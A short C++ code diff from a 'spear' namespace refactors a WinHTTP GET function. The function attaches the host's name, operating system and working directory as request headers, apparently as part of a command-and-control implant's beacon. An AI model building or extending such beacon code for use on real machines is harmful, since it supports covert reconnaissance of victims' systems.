@@ -83,7 +83,7 @@ namespace spear
     /// @brief 
     /// @param uri 
     /// @return 
-    std::optional<nlohmann::json> HttpGet(const std::wstring& uri)
+    nlohmann::json HttpGet(const std::wstring& uri)
     {
         DWORD blockSize;
         DWORD readSize;
@@ -94,19 +94,19 @@ namespace spear
 
         Win32::WinHttpAddRequestHeaders(
             HinternetList.hRequest,
-            Instance.Headers.hostName.insert(0, L"host: ").c_str(),
+            Instance.Info.hostName.insert(0, L"host: ").c_str(),
             -1L,
             WINHTTP_ADDREQ_FLAG_ADD
         );
         Win32::WinHttpAddRequestHeaders(
             HinternetList.hRequest,
-            Instance.Headers.os.insert(0, L"os: ").c_str(),
+            Instance.Info.os.insert(0, L"os: ").c_str(),
             -1L,
             WINHTTP_ADDREQ_FLAG_ADD
         );
         Win32::WinHttpAddRequestHeaders(
             HinternetList.hRequest,
-            Instance.Headers.cwd.insert(0, L"cwd: ").c_str(),
+            Instance.Info.cwd.insert(0, L"cwd: ").c_str(),
             -1L,
             WINHTTP_ADDREQ_FLAG_ADD
         );
